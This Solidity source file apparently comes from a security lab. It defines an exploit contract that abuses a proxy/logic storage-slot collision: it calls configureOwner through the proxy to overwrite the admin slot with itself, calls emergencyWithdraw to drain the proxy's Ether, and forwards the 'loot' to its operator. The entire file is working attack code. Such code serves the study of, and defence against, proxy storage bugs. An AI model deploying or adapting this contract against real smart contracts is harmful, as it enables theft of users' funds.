// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.28;

interface ICollidingProxyVault {
    function emergencyWithdraw(address recipient) external;
}

/// @title StorageCollisionAttacker
/// @author Solidity Security Lab
/// @notice Exploit contract that abuses proxy/logic storage slot collisions to seize admin control and drain funds.
contract StorageCollisionAttacker {
    /// @notice Operator controlling the exploit contract.
    address public immutable operator;

    event AttackExecuted(address indexed proxy, uint256 drainedAmount);
    event LootWithdrawn(address indexed recipient, uint256 amount);

    constructor() {
        operator = msg.sender;
    }

    /// @notice Executes the full storage-collision exploit against a vulnerable proxy.
    function attack(address proxyAddress) external {
        require(msg.sender == operator, "Only operator can attack");

        // Step 1:
        // Call configureOwner(address) through the proxy. Because the proxy stores admin in slot 0,
        // delegatecalling into logic.configureOwner() writes owner to slot 0 and overwrites admin
        // with address(this).
        (bool configureSuccess, ) = proxyAddress.call(
            abi.encodeWithSignature("configureOwner(address)", address(this))
        );
        require(configureSuccess, "Owner collision failed");

        // Step 2:
        // The proxy now believes this contract is admin, so the admin-only emergency
        // withdrawal can be called directly on the proxy.
        uint256 amountBefore = address(this).balance;
        ICollidingProxyVault(proxyAddress).emergencyWithdraw(address(this));

        emit AttackExecuted(proxyAddress, address(this).balance - amountBefore);
    }

    /// @notice Transfers stolen Ether to the attacker operator.
    function withdrawLoot() external {
        require(msg.sender == operator, "Only operator can withdraw loot");

        uint256 lootAmount = address(this).balance;
        require(lootAmount > 0, "No loot available");

        (bool success, ) = payable(operator).call{value: lootAmount}("");
        require(success, "Loot transfer failed");

        emit LootWithdrawn(operator, lootAmount);
    }

    receive() external payable {}
}
